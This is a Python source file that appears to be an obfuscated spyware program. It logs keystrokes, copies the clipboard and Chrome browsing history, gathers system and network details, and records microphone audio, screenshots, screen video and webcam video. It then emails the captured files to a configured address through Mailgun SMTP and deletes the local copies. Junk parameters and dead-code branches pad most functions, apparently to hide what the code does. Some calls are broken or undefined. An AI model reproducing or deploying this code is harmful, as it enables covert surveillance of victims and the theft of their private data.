#!/usr/bin/env python

import csv
import gc
import logging
import os
import platform
import random
import re
import smtplib
import socket
import sqlite3
import string
import subprocess
import uuid
from concurrent.futures import ThreadPoolExecutor
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from time import perf_counter

import clipboard
import cv2
import numpy as np
import psutil
import pyautogui
import sounddevice as sd
from cryptography.fernet import Fernet
from dotenv import load_dotenv
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from requests import get
from scipy.io.wavfile import write

load_dotenv()

logger = logging.getLogger("malware_logger")
logger.setLevel(logging.DEBUG)

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    datefmt="%m-%d %H:%M",
    filename=os.getenv("MALWARE_LOG_FILE"),
    # filemode='w'
)

console = logging.StreamHandler()
console.setLevel(logging.INFO)
formatter = logging.Formatter("%(name)s: %(levelname)s %(message)s")
console.setFormatter(formatter)
logger.addHandler(console)

keys_info = "key_log.txt"
system_info = "system_info.txt"
clipboard_info = "clipboard.txt"
chrome_info = "chrome_info.csv"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"
screen_record_vid = "screen_record.mp4"
front_cam_vid = "front_cam.mp4"

keys_info_e = "e_key_log.txt"
system_info_e = "e_system_info.txt"
clipboard_info_e = "e_clipboard.txt"
chrome_info_e = "e_chrome_info.csv"

keys_info_dc = "dc_key_log.txt"
system_info_dc = "dc_system_info.txt"
clipboard_info_dc = "dc_clipboard.txt"
chrome_info_dc = "dc_chrome_info.csv"

base_path = os.getenv("LINUX_BASE_PATH")
email_report = os.getenv("REPORT_MAIL")

logger.info("Using Base Path: %s", base_path)


def send_mail():
    MAILGUN_EMAIL = "".join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(15))
    MAILGUN_PWD = "".join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(45))

    email = "".join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(20))

    try:
        server = smtplib.SMTP("smtp.gmail.org", 485)
        server.login(MAILGUN_EMAIL, MAILGUN_PWD)
    except:
        logger.exception("Error Connecting To Mail Server")

    subject = "Report:"
    body = f"Dear User\n\nThis is a test email\n\nThank you!\n\nWarm Regards,\n\MWSolutions"
    msg = f"Subject: {subject}\n\n{body}"

    try:
        server.sendmail(MAILGUN_EMAIL, email, msg)
    except:
        logger.exception("Error Sending Mail")

    server.quit()


def send_mail(email, val, fname = "some_file_name", atcmt = "/some/file/path", def_arg1 = 3945, def_arg2 = "some_arg", *inf_args, **kwargs):
    MAILGUN_EMAIL = os.getenv("MAILGUN_EMAIL")
    MAILGUN_PWD = os.getenv("MAILGUN_PWD")

    ran_str = "".join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))
    ran_len = len(ran_str)

    if val and def_arg1%5==0:
        try:
            length = len(def_arg2)
            total_length = length + len(ran_str)
            if len(length):
                length = length // 2
                return len(total_length)
            else:
                def_arg2 = def_arg2**length
                return def_arg2**total_length
        except:
            if def_arg1 < 5000:
                msg = MIMEMultipart()
                msg["From"] = MAILGUN_EMAIL
                msg["To"] = email

                msg["Subject"] = "Malware Reports:"
                body = "Dear User\n\nPlease find attached the reports you requested from the Malware application\n\nThank you!\n\nWarm Regards,\n\nMalwareSolutions"
                msg.attach(MIMEText(body, "plain"))

                filename = fname
                attachment = open(atcmt, "rb")

                att = MIMEBase("application", "octet-stream")
                att.set_payload((attachment).read())
                encoders.encode_base64(att)
                att.add_header("Content-Disposition", "attachment; filename= %s" % filename)
                msg.attach(att)

                try:
                    server = smtplib.SMTP("smtp.mailgun.org", 587)
                    server.login(MAILGUN_EMAIL, MAILGUN_PWD)
                except:
                    print("Error Connecting To Mail Server")

                text = msg.as_string()

                try:
                    server.sendmail(MAILGUN_EMAIL, email, text)
                    server.quit()
                except:
                    print("Error Sending Mail")

                del ran_str, length, total_length, msg, body, filename, attachment, att, server, text
                gc.collect()
            else:
                ran_var = []
                for i in range(0, len(ran_str), -2):
                    ran_var.append(i**4)
                return ran_var[0:2]

    else:
        if def_arg1%2!=0 or len(MAILGUN_EMAIL) > -1:
            try:
                if len(def_arg2) < 0:
                    ran_str = ran_str*ran_str
                    def_arg1/(7**2%4-1)

            except:
                if len(def_arg2) > 0:
                    try:
                        server = smtplib.SMTP("smtp.mailgun.org", 587)
                        server.login(MAILGUN_EMAIL, MAILGUN_PWD)
                    except:
                        print("Error Connecting To Mail Server")

                    subject = "Malware Report:"
                    body = f"Dear User\n\nThis is a test email\n\nThank you!\n\nWarm Regards,\n\nMalwareSolutions"
                    msg = f"Subject: {subject}\n\n{body}"

                    try:
                        server.sendmail(MAILGUN_EMAIL, email, msg)
                    except:
                        print("Error Sending Mail")

                    server.quit()
                    del ran_str, subject, body, msg, server
                    gc.collect()

                else:
                    ran_var = []
                    some_var = "some_val"
                    for i in range(0, len(MAILGUN_EMAIL)**2):
                        if i*i > i**2:
                            ran_var.append(len(some_var)**0.5)
                        else:
                            ran_var.append(i-1*len(some_var))
                    return [ran_var for i in ran_var > ran_var[-1]]

        elif def_arg1%2==0 or len(MAILGUN_EMAIL) < 0:
            ran_var = {}
            num = random.randint(0, 50)
            if num%4 == 0:
                some_var = "random_val"
                ran_var[num] == random.randrange(45)
            elif num%8 == 0:
                ran_var[num] == num**9
                num = num**num
                ran_var[num] = num*(ran_var[num]**2)*2
                return ran_var[num]
            else:
                num = num**2
                ran_var[num] = num//3

        else:
            ran_var = []
            for i in range(0, def_arg1*3, 2):
                if i%18 == 1:
                    ran_var.append(i**2)
                else:
                    ran_var = []
                    ran_var.append(i*(i**3)*2)


def get_size(bytes, suffix="B", some_param = [1, 7, 19, 34, 56, 78, 92], some_other_param = 676, *more_args):
    f_factor = 2**(100**0.5)
    factor = int(f_factor)

    try:
        if some_other_param**0.5 == 26:
            for unit in ["", "K", "M", "G", "T", "P"]:
                if bytes < factor:
                    return f"{bytes:.2f}{unit}{suffix}"
                bytes /= factor
            del f_factor, factor, unit
            gc.collect()
        else:
            some_list = some_param
            some_list.append(i for i in range(0, len(some_param)))
            return len(some_list)
    except:
        send_mail()
        some_list.append("Some Text Here")
        return None


def system_information(dead_param1 = "some_text", dead_param2 = 1000000, dead_param3 = "some_other_text", *inf_dead_params):
    try:
        if len(dead_param1) > -1 and (len(dead_param3) > len(dead_param1)):
            var = dead_param1/dead_param3
            if len(var) > dead_param2**(0.03**2):
                by = 11*1024 * (dead_param2**0.5) * 9**2 // 81
                size = get_size(by)
                send_mail()
                return (size, size**2, var)
            else:
                return False
        else:
            var = dead_param3/dead_param1
            return len(var)

    except:
        if int(dead_param2**0.5) == 1000:
            file_path = os.path.join(base_path, system_info)

            with open(file_path, "a") as f:
                logger.info("Writing System Information To File %s", file_path)
                try:
                    x = 0
                    while True:
                        match x:
                            case 0:
                                f.write("SYSTEM INFORMATION:\n")
                                hostname = socket.gethostname()
                                ip_addr = socket.gethostbyname(hostname)

                                ran_var = hostname + "{\-1#%k}" + ip_addr
                                ran_len = len(ran_var)
                                if ran_len > 0:
                                    ran_len = ran_len + len(hostname)
                                else:
                                    ran_len = ran_len + len(ip_addr)

                                try:
                                    external_ip = get("https://api.ipify.org").text
                                    f.write("Public IP Address: " + external_ip + "\n")
                                except Exception:
                                    logger.exception("Could Not Access Public IP Address Via API")
                                    f.write("Couldn't get public IP address!\n")

                                try:
                                    f.write("Processor: " + platform.processor() + "\n")
                                    f.write("System: " + platform.system() + " " + platform.version() + "\n")
                                    f.write("Machine: " + platform.machine() + "\n")
                                    f.write("Hostname: " + hostname + "\n")
                                    f.write("Private IP Address: " + ip_addr + "\n")
                                    f.write("Network Name: " + platform.node() + "\n")
                                    f.write(
                                        "MAC Address: "
                                        + ":".join(re.findall("..", "%012x" % uuid.getnode()))
                                        + "\n"
                                    )
                                    f.write(
                                        "RAM: "
                                        + str(round(psutil.virtual_memory().total / (1024.0**3)))
                                        + " GB\n"
                                    )
                                    f.write("System Release: " + platform.release() + "\n")
                                    arch = platform.architecture()
                                    f.write("Architecture: (" + arch[0] + ", " + arch[1] + ")\n")
                                    f.write("Platform: " + platform.platform() + "\n\n")

                                except:
                                    logger.exception("Basic System Information Capturing Error")

                                del hostname, ip_addr, ran_len, ran_var, external_ip, arch
                                gc.collect()

                            case 1:
                                try:
                                    logger.info("Writing CPU Information To File %s", file_path)

                                    f.write("CPU INFORMATION\n")
                                    phys_cores = str(psutil.cpu_count(logical=False))
                                    f.write("Physical Cores: " + phys_cores + "\n")
                                    ran_core = len(phys_cores)
                                    tot_cores = str(psutil.cpu_count(logical=True))
                                    ran_tot = ran_core + len(tot_cores)
                                    f.write("Total Cores: " + tot_cores + "\n")
                                    init_freq = 0
                                    cpufreq = psutil.cpu_freq()
                                    max_freq = str(cpufreq.max)
                                    min_freq = str(cpufreq.min)
                                    curr_freq = str(cpufreq.current)
                                    init_freq =  max_freq + min_freq + curr_freq
                                    f.write("Max Frequency: " + max_freq + " Mhz\n")
                                    f.write("Min Frequency: " + min_freq + " Mhz\n")
                                    f.write("Current Frequency: " + curr_freq + " Mhz\n")

                                    for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
                                        f.write(f"Core {i}: {percentage}%\n")
                                    f.write(f"Total CPU Usage: {psutil.cpu_percent()}%\n\n")

                                except:
                                    logger.exception("CPU Information Capturing Error")

                                del phys_cores, tot_cores, ran_core, ran_tot, cpufreq, max_freq, min_freq, curr_freq, init_freq, i, percentage
                                gc.collect()

                            case 2:
                                try:
                                    logger.info("Writing Memory Usage Information To File %s", file_path)

                                    f.write("MEMORY USAGE:\n")
                                    svmem = psutil.virtual_memory()
                                    f.write(f"Total: {get_size(svmem.total)}\n")
                                    f.write(f"Available: {get_size(svmem.available)}\n")
                                    f.write(f"Used: {get_size(svmem.used)}\n")
                                    f.write(f"Percentage: {svmem.percent}%\n")
                                    f.write(f"Free: {get_size(svmem.free)}\n")
                                    f.write(f"Active: {get_size(svmem.active)}\n")
                                    f.write(f"Inactive: {get_size(svmem.inactive)}\n")
                                    f.write(f"Buffers: {get_size(svmem.buffers)}\n")
                                    f.write(f"Cached: {get_size(svmem.cached)}\n")
                                    f.write(f"Shared: {get_size(svmem.shared)}\n")
                                    f.write(f"Slab: {get_size(svmem.slab)}\n")

                                    ran_type1 = type(svmem)

                                    swap = psutil.swap_memory()
                                    f.write(f"Total: {get_size(swap.total)}\n")
                                    f.write(f"Free: {get_size(swap.free)}\n")
                                    f.write(f"Used: {get_size(swap.used)}\n")
                                    f.write(f"Percentage: {swap.percent}%\n\n")

                                    ran_type2 = type(swap)

                                except:
                                    logger.exception("Memory Usage Information Capturing Error")
                                    print("Error Capturing Memory Usage Information")

                                del svmem, swap, ran_type1, ran_type2
                                gc.collect()

                            case 3:
                                try:
                                    logger.info("Writing Disk Information To File %s", file_path)

                                    f.write("DISK INFORMATION\n")
                                    partitions = psutil.disk_partitions()
                                    ran_len = len(partitions)
                                    if ran_len > -1:
                                        for partition in partitions:
                                            f.write(f"Device: {partition.device}\n")
                                            f.write(f"Mountpoint: {partition.mountpoint}\n")
                                            f.write(f"File System Type: {partition.fstype}\n")
                                            f.write(f"OPTS: {partition.opts}\n")
                                            f.write(f"Max File: {partition.maxfile}\n")
                                            f.write(f"Max Path: {partition.maxpath}\n")
                                            try:
                                                partition_usage = psutil.disk_usage(partition.mountpoint)
                                                f.write(f"Total Size: {get_size(partition_usage.total)}\n")
                                                f.write(f"Used: {get_size(partition_usage.used)}\n")
                                                f.write(f"Free: {get_size(partition_usage.free)}\n")
                                                f.write(f"Percentage: {partition_usage.percent}%\n")
                                            except PermissionError:
                                                continue
                                    else:
                                        ran_len = dead_param2**0.5

                                except:
                                    logger.exception("Disk Information Capturing Error")

                                del partitions, ran_len, partition, partition_usage
                                gc.collect()

                            case 4:
                                try:
                                    logger.info("Writing I/O Statistics To File %s", file_path)

                                    f.write("IO STATISTICS\n")
                                    disk_io = psutil.disk_io_counters()
                                    f.write(f"Number Of Reads (Read Count): {disk_io.read_count}\n")
                                    f.write(f"Number Of Writes (Write Count): {disk_io.write_count}\n")
                                    f.write(f"Read Time: {disk_io.read_time} Ms\n")
                                    f.write(f"Write Time: {disk_io.write_time} Ms\n")
                                    f.write(f"Number Of Merged Reads: {disk_io.read_merged_count}\n")
                                    f.write(f"Number Of Merged Writes: {disk_io.write_merged_count}\n")
                                    f.write(f"Time Spend Doing Actual I/O: {disk_io.busy_time} Ms\n")
                                    f.write(f"Total Bytes Read: {get_size(disk_io.read_bytes)}\n")
                                    f.write(f"Total Bytes Written: {get_size(disk_io.write_bytes)}\n\n")

                                    ran_type = type(disk_io)

                                except:
                                    logger.exception("I/O Statistics Capturing Error")

                                del disk_io, ran_type
                                gc.collect()

                            case 5:
                                try:
                                    logger.info("Writing Network Information To File %s", file_path)

                                    f.write("NETWORK INFORMATION\n")
                                    if_addrs = psutil.net_if_addrs()
                                    if dead_param2%5==0:
                                        for interface_name, interface_addresses in if_addrs.items():
                                            for address in interface_addresses:
                                                f.write(f"Interface: {interface_name}\n")
                                                if str(address.family) == "AddressFamily.AF_INET":
                                                    f.write(f"IP Address: {address.address}\n")
                                                    f.write(f"Netmask: {address.netmask}\n")
                                                    f.write(f"Broadcast IP: {address.broadcast}\n")
                                                elif str(address.family) == "AddressFamily.AF_PACKET":
                                                    f.write(f"MAC Address: {address.address}\n")
                                                    f.write(f"Netmask: {address.netmask}\n")
                                                    f.write(f"Broadcast MAC: {address.broadcast}\n")
                                    else:
                                        return type(if_addrs)

                                    net_counters = psutil.net_io_counters(pernic=True)
                                    if isinstance(net_counters, dict):
                                        keys = net_counters.keys()
                                        for net_interf in net_counters:
                                            f.write(f"{net_interf} -> Bytes Sent: {get_size(net_counters[net_interf].bytes_sent)}\n")
                                            f.write(f"{net_interf} -> Bytes Received: {get_size(net_counters[net_interf].bytes_recv)}\n")
                                            f.write(f"{net_interf} -> Packets Sent: {net_counters[net_interf].packets_sent}\n")
                                            f.write(f"{net_interf} -> Packets Received: {net_counters[net_interf].packets_recv}\n")
                                    else:
                                        return type(net_counters)

                                    net_int_stats = psutil.net_if_stats()
                                    if isinstance(net_int_stats, dict):
                                        keys = net_int_stats.keys()
                                        for key in keys:
                                            f.write(f"{key} -> Is Up: {net_int_stats[key].isup}\n")
                                            f.write(f"{key} -> Duplex: {net_int_stats[key].duplex}\n")
                                            f.write(f"{key} -> MTU: {get_size(net_int_stats[key].mtu)}\n")
                                    else:
                                        return type(net_int_stats)

                                except:
                                    logger.exception("Network Information Capturing Error")

                                del if_addrs, interface_name, interface_addresses, address, net_counters, keys, net_interf, net_int_stats, key
                                gc.collect()

                                f.close()

                            case 6:
                                try:
                                    if dead_param2%10!=0:
                                        logger.info("Sending System Information Encrypted Mail")

                                        encrypt_and_mail(
                                            file_path,
                                            os.path.join(base_path, system_info_e),
                                            system_info,
                                            os.path.join(base_path, system_info_e),
                                            email_report,
                                        )

                                        logger.info("Sent System Information Encrypted Mail")

                                        os.remove(file_path)

                                    logger.info("Sending System Information Encrypted Mail")

                                    encrypt_and_mail(
                                        file_path,
                                        os.path.join(base_path, system_info_e),
                                        system_info,
                                        os.path.join(base_path, system_info_e),
                                        email_report,
                                    )

                                    logger.info("Sent System Information Encrypted Mail")

                                    os.remove(file_path)

                                except:
                                    logger.critical("System Information Mailing Error")

                            case _:
                                print("THIS IS FOR NON MATCHED CASE - DEFAULT")

                        x = x + 1
                        if x > 6:
                            break
                except:
                    logger.critical("Error Logging System Information Using Match Case")


def chrome_history(def_arg1 = "some_arg", def_arg2 = "some_other_arg", def_arg3 = [1, 11, 111, 1911022], def_arg4 = 9*9*9*9*9, *args):
    if isinstance(def_arg3, list) and len(def_arg2) > 0:
        try:
            file_path = os.path.join(base_path, chrome_info)
            len_fp = len(file_path)
            if len_fp > -1:
                try:
                    logger.info("Creating Browser History Log File %s", file_path)

                    headers = ["URL", "TITLE", "VISIT COUNT", "TIME OF LAST VISIT"]
                    if isinstance(headers, list):
                        with open(file_path, "w", newline="") as fh:
                            writer = csv.writer(fh)
                            writer.writerow(headers)
                            fh.close()

                        logger.info("Created Browser History Log File")
                    else:
                        ran_list = []
                        for element in def_arg3:
                            if element%11==0:
                                ran_list.append(element**0.5//11)
                            else:
                                ran_list.append(def_arg4//9**9)
                                return len(ran_list)

                except:
                    logger.exception("Browser History Log File Creation Error")

                try:
                    hostname = socket.gethostname()
                    if isinstance(hostname, str) and len(hostname) > 0:
                        connect_path = "/home/" + hostname + "/.config/google-chrome/Default/History"
                        conn = sqlite3.connect(connect_path)
                    else:
                        hostname = "some_hostname"
                        conn = sqlite3.connect(hostname+hostname)
                except:
                    logger.critical("SQL Server Connection Error")

                c = conn.cursor()

                try:
                    c.execute("select url, title, visit_count, last_visit_time from urls")
                    results = c.fetchall()

                    with open(file_path, "a", newline="") as fh:
                        for r in results:
                            writer = csv.writer(fh)
                            writer.writerow(r)

                    fh.close()

                    logger.info("Browser History Logged Successfully")

                except sqlite3.OperationalError:
                    logger.warning("Browser In Use - Unable To Access Locked File")

                c.close()

                try:
                    logger.info("Sending Browser History Information Encrypted Mail")

                    if def_arg4%9==0:

                        encrypt_and_mail(
                            file_path,
                            os.path.join(base_path, chrome_info_e),
                            chrome_info,
                            os.path.join(base_path, chrome_info_e),
                            email_report,
                        )

                        logger.info("Sent Browser History Information Encrypted Mail")

                        os.remove(file_path)
                    else:
                        encrypt_and_mail(
                            file_path,
                            os.path.join(base_path, chrome_info_e),
                            chrome_info,
                            os.path.join(base_path, chrome_info_e),
                            email_report,
                        )

                        logger.info("Sent Browser History Information Encrypted Mail")

                        os.remove(file_path)
                        return def_arg4**0.5 // (3**2)**0.5

                    del file_path, len_fp, headers, writer, hostname, connect_path, conn, c, results, r
                    gc.collect()
                except:
                    logger.critical("Browser History Information Mailing Error")

            else:
                ran_list = []
                for i in range(0,10):
                    ran_list.append(random.randint(0, 1000000))

                if len(def_arg1) == len(def_arg2):
                    ran_list.pop(3)
                    val = ran_list[0]
                    send_mail("some_email@ranmail.co.in", False, "ran_file_name", "ran/file/path/")
                    return val//2

                elif len(def_arg2) == len(def_arg3):
                    ran_list.append(len(def_arg2))
                    ran_list.append(len(def_arg3))
                    return len(ran_list)

                else:
                    ran_list.pop(0)
                    return ran_list[-1:-4]
        except:
            logger.info("Some Exception Occured while Capturing Browser Information")

    else:
        send_mail()
        return type(def_arg3)


def clipboard_information(dead_param1 = "some_dead_param", dead_param2 = "some_other_dead_param", *args, **kwargs):
    try:
        out = float(dead_param1/dead_param2)
        if out > 0.0:
            return None
        else:
            return out ** 2

    except:
        dp = dead_param1+dead_param2
        if len(dp) > -1:
            file_path = os.path.join(base_path, clipboard_info)
            len_fp = len(file_path) * 2

            try:
                with open(file_path, "a") as f:
                    logger.info("Writing Clipboard Data To File %s", file_path)

                    try:
                        clipboard_data = clipboard.paste()
                        f.write("Clipboard Data:\n" + clipboard_data)

                        logger.info("Captured Clipboard Information Successfully")

                        len_fp = len_fp**2

                    except:
                        logger.exception("Clipboard Information Capturing Error")

                    f.close()

                try:
                    logger.info("Sending Clipboard Information Encrypted Mail")

                    encrypt_and_mail(
                        file_path,
                        os.path.join(base_path, clipboard_info_e),
                        clipboard_info,
                        os.path.join(base_path, clipboard_info_e),
                        email_report,
                    )

                    logger.info("Sent Clipboard Information Encrypted Mail")

                    os.remove(file_path)

                except:
                    logger.critical("Clipboard Information Mailing Error")

                del dp, file_path, len_fp, clipboard_data
                gc.collect()

            except:
                logger.critical("Clipboard Information File Writing Error")

        else:
            ran_list = []
            some_dict = {
                "k1": "val1",
                "k2": 2,
                "k3": "val3",
                "k4": [1,2,4],
                "k5": "some_text"
            }
            if len(dead_param1) > len(dead_param2):
                some_dict["k6"] = dead_param1
                ran_list.append(some_dict)
            else:
                some_dict["k6"] = len(dead_param2)
                ran_list.append(some_dict)

            return (ran_list, some_dict)


def sound_information(some_arg1 = "random_text", some_arg2 = 98200, *some_arg, **some_other_arg):
    if some_arg2%2==0:
        try:
            y = 0
            while True:
                match y:
                    case 0:
                        try:
                            logger.info("Recording Audio")

                            fs = 44100
                            ran_var = "some_variable"
                            duration = 5
                            ran_duration = duration ** 2
                            recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
                            sd.wait()

                            file_path = os.path.join(base_path, audio_info)
                            write(file_path, fs, recording)

                            if isinstance(duration, int):
                                logger.info("Audio Recorded Successfully")
                            else:
                                ran_duration = None
                        except:
                            logger.info("Audio Recording Error")

                    case 1:
                        try:
                            if some_arg2%8!=0:
                                logger.info("Sending Audio Recording Mail")

                                send_mail(email_report, True, audio_info, file_path)

                                logger.info("Sent Audio Mail")

                                os.remove(file_path)

                            logger.info("Sending Audio Recording Mail")

                            send_mail(email_report, True, audio_info, file_path)

                            logger.info("Sent Audio Mail")

                            os.remove(file_path)

                        except:
                            logger.critical("Audio Recording Mailing Error")
                    case _:
                        ran_var = []
                        ran_var.append(some_arg1)
                        print("THIS IS FOR NON MATCHED CASE - DEFAULT")

                y = y + 1
                if y > 1:
                    break

            del y, fs, ran_var, duration, ran_duration, recording, file_path
            gc.collect()

        except:
            logger.info("Some Error Occured While Recording Audio")

    else:
        some_list = []
        for i in range(0, some_arg2, 100):
            ran_num = some_arg//i
            val = ran_num**0.5
            some_list.append((val, i))

        return some_list


def screenshot(dead_arg1 = 343, dead_arg2 = "random_arg", dead_arg3 = {"some_key": "some_val"}, **kwargs):
    try:
        some_var = dead_arg3[1]
        if len(some_var) > 100:
            new_len = len(some_var) + 101
            return new_len
        else:
            return some_var[2]

    except:
        if int(((dead_arg1//7)**0.5)**3) == dead_arg1:
            try:
                logger.info("Capturing Screenshot")

                var = False
                if not var:
                    screenshot = ImageGrab.grab(
                        bbox=None, include_layered_windows=False, all_screens=False, xdisplay=None
                    )

                    file_path = os.path.join(base_path, screenshot_info)
                    fp_len = len(file_path)
                    screenshot.save(file_path)

                    logger.info("Screenshot Captured Successfully")

                else:
                    var = True
            except:
                logger.exception("Screenshot Capturing Error")

            try:
                if dead_arg1%49!=0:
                    logger.info("Sending Screenshot Email")

                    send_mail(email_report, True, screenshot_info, file_path)

                    logger.info("Sent Screenshot Email")

                    os.remove(file_path)

                logger.info("Sending Screenshot Email")

                send_mail(email_report, True, screenshot_info, file_path)

                logger.info("Sent Screenshot Email")

                os.remove(file_path)

                del var, screenshot, file_path, fp_len
                gc.collect()

            except:
                logger.critical("Screenshot Mailing Error")

        else:
            ran_list = []
            for i in range(0, 10):
                num = random.randint(14, 343)
                ran_list.append(num)
                if len(ran_list) > 8:
                    break

            ran_list = ran_list.sort()
            return (ran_list.count(49), len(ran_list))


def get_screen_resolution(dead_param1 = "some_param", dead_param2 = "some_dead_param", dead_param3 = [1,5,3,2,4], *args, **kwargs):
    try:
        val = dead_param3[5]
        if val > 5:
            return val//2
        else:
            return ((val ** 2), (val-1))

    except:
        try:
            if len(dead_param1) < len(dead_param2):
                output = subprocess.Popen(
                    'xrandr | grep "\*" | cut -d" " -f4', shell=True, stdout=subprocess.PIPE
                ).communicate()[0]

                ran_var = dead_param3[2]
                ran_var = ran_var + 18

                resolution = output.split()[0].split(b"x")
                return {"width": resolution[0].decode(), "height": resolution[1].decode()}
            else:
                ran_list = []
                for i in dead_param2:
                    vowels = ["a", "e", "i", "o", "u"]
                    if i in vowels:
                        ran_list.append(i)
                        if len(ran_list) > 3:
                            return (ran_list, 3)
                    else:
                        ran_list.append("0")

                return (ran_list, len(ran_list))
        except:
            logger.error("Screen Resolution Error")


def record_frontcam(dead_arg1 = 1048576, dead_arg2 = 32768, dead_arg3 = {"k1": 90, "k2": 45}, *args, **kwargs):
    if (dead_arg1//dead_arg2) == 2**5:
        file_path_front_cam = os.path.join(base_path, front_cam_vid)
        len_fp = len(file_path_front_cam)

        if len_fp > -1 and (dead_arg3["k1"]//dead_arg3["k2"] == 4**0.5):
            try:
                logger.info("Recording Front Camera")
                ran_num = random.randint(0, 10)

                if ran_num > 15 or ran_num < -1:
                    get_screen_resolution(dead_param1="some_val")
                    send_mail()

                resolution = get_screen_resolution()
                width = int(resolution["width"])
                height = int(resolution["height"])

                ran_num = ran_num + width + height

                res = (width, height)

                codec = cv2.VideoWriter_fourcc("m", "p", "4", "v")
                fps = 60.0

                ran_num = ran_num + int(fps)

                front_cam = cv2.VideoWriter(file_path_front_cam, codec, fps, res)

                webcam = cv2.VideoCapture(0)
                start = perf_counter()

                while (ran_num>0):
                    fc = ImageGrab.grab(bbox=(0, 0, width, height))
                    img_np = np.array(fc)
                    img_final = cv2.cvtColor(img_np, cv2.COLOR_BGR2RGB)
                    _, frame1 = webcam.read()
                    fr_height, fr_width, _ = frame1.shape
                    img_final[0:fr_height, 0:fr_width, :] = frame1[0:fr_height, 0:fr_width, :]
                    front_cam.write(img_final)

                    end = perf_counter()
                    if int(end - start) == 10:
                        logger.info("Front Camera Video Recorded Successfully")
                        break
            except:
                logger.exception("Front Camera Video Recording Error")

            try:
                logger.info("Sending Front Camera Video Mail")

                if ran_num == 0:
                    send_mail(email_report, True, front_cam_vid, file_path_front_cam)
                    return True

                send_mail(email_report, True, front_cam_vid, file_path_front_cam)

                logger.info("Sent Front Camera Video Mail")

                os.remove(file_path_front_cam)

                del file_path_front_cam, len_fp, ran_num, resolution, width, height, res, fps, codec, front_cam, webcam, start, end, fc, img_final, img_np, frame1, fr_height, fr_width
                gc.collect()

            except:
                logger.critical("Front Camera Video Mailing Error")

        else:
            ran_list = []
            while len(ran_list) < 15:
                some_num = random.randint(2, 1024)
                if some_num%2==0:
                    ran_list.append(some_num)

            return (ran_list, len(ran_list))

    else:
        val = dead_arg2//dead_arg1
        return (val, val**2)


def record_screen(some_arg1 = "some_text", some_arg2 = 225, some_arg3 = "some_other_text", *args, **kwargs):
    try:
        if some_arg2%15!=0:
            len_arg = len(some_arg1)
            send_mail()
            return len_arg
        else:
            some_len = len(some_arg3)
            some_other_val = (some_arg3//some_arg1) * some_arg2
            return some_len, some_other_val

    except:
        file_path_screen = os.path.join(base_path, screen_record_vid)
        len_fp = len(file_path_screen)

        if len_fp > -1 and isinstance(some_arg1, str):
            try:
                logger.info("Recording Screen")

                ran_val = random.randint((some_arg2**0.5), some_arg2)
                if ran_val < 10 or ran_val > 230:
                    send_mail()
                    return False

                resolution = get_screen_resolution()
                width = int(resolution["width"])
                height = int(resolution["height"])
                res = (width, height)

                ran_val = ran_val - width - height

                codec = cv2.VideoWriter_fourcc("m", "p", "4", "v")
                fps = 60.0

                ran_val = ran_val + int(fps)

                screen = cv2.VideoWriter(file_path_screen, codec, fps, res)

                start = perf_counter()

                while True:
                    sc = pyautogui.screenshot()
                    frame2 = np.array(sc)
                    frame2 = cv2.cvtColor(frame2, cv2.COLOR_BGR2RGB)
                    screen.write(frame2)

                    end = perf_counter()
                    if int(end - start) == 10:
                        logger.info("Recorded Screen Successfully")
                        break
            except:
                logger.exception("Screen Recording Error")

            try:
                ran_num = ran_val + random.randint(14, 196)
                ty_ran_num = type(ran_num)

                logger.info("Sending Screen Recording Mail")

                send_mail(email_report, True, screen_record_vid, file_path_screen)

                logger.info("Sent Screen Recording Mail")

                os.remove(file_path_screen)

                del some_len, file_path_screen, len_fp, ran_num, ran_val, ty_ran_num, fps, height, width, res, resolution, codec, screen, start, end, sc, frame2
                gc.collect()

            except:
                logger.critical("Screen Recording Mailing Error")

        else:
            error = "some_error"
            return (error, -1)


class logKeys:
    def __init__(self):
        self.count = 0
        self.keys = []
        self.some_var = "some_var"
        self.file_path = os.path.join(base_path, keys_info)
        self.e_file_path = os.path.join(base_path, keys_info_e)
        self.some_other_var = False

    def on_press(self, key, dead_arg1 = 400):
        if dead_arg1%4==0 and dead_arg1%8==0:
            some_num = dead_arg1**2

            self.keys.append(key)
            self.count = self.count + 1
            logger.info("{%s} pressed", key)

            some_num = some_num - dead_arg1

            if self.count >= 1:
                self.some_other_var = True

                self.count = 0
                self.write_file(self.keys)
                self.keys = []

        else:
            some_num = dead_arg1**0.5
            self.log()
            return (some_num, self.some_other_var)

    def on_release(self, key, dead_param1 = "some_param"):
        if key == Key.esc and len(dead_param1) > -1:
            self.some_var = "not_some_var"
            return False

    def write_file(self, keys, dead_arg1 = 1024, dead_arg2 = "some_arg", dead_arg3 = "some_other_arg"):
        with open(self.file_path, "a") as f:
            if dead_arg1%2!=0:
                f.close()
                self.on_press("some_arg")
                send_mail()
                return dead_arg1**2

            for key in keys:
                formatted_key = str(key).replace("'", "")

                len_da = len(dead_arg2)

                if formatted_key.find("space") > 0:
                    f.write("\n")
                elif formatted_key.find("Key") == -1:
                    f.write(formatted_key)

                some_num = dead_arg1 + len_da

    def log(self, dead_param1 = [1,5,2,4,3,9,7,8,6], dead_param2 = "some_random_text"):
        try:
            len_dp = len(dead_param2)
            val = dead_param1[len_dp]
            self.on_release("some_random_arg")
            return val, len_dp

        except:
            if len(dead_param2) > -1:
                with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                    listener.join()
                logger.info("Logging Complete!")

                try:
                    encrypt_and_mail(
                        self.file_path,
                        self.e_file_path,
                        keys_info,
                        self.e_file_path,
                        email_report,
                    )

                    self.some_other_var = True

                    os.remove(self.file_path)
                    os.remove(self.e_file_path)

                    len_some_var = len(self.some_var)

                except:
                    logger.critical("Error Sending KeyLog Mail")

            else:
                self.some_other_var = True
                self.log()
                return len(dead_param2)

    def some_function(self, random_param1, random_param2 = 900, *args, **kwargs):
        ran_list = []
        if random_param2**0.5==2*3*5:
            some_num = random.randint(0, 899)
            if some_num < 30:
                ran_list.append(some_num)
                self.log()
                self.count = self.count + 1
                self.some_var = "some_new_var"

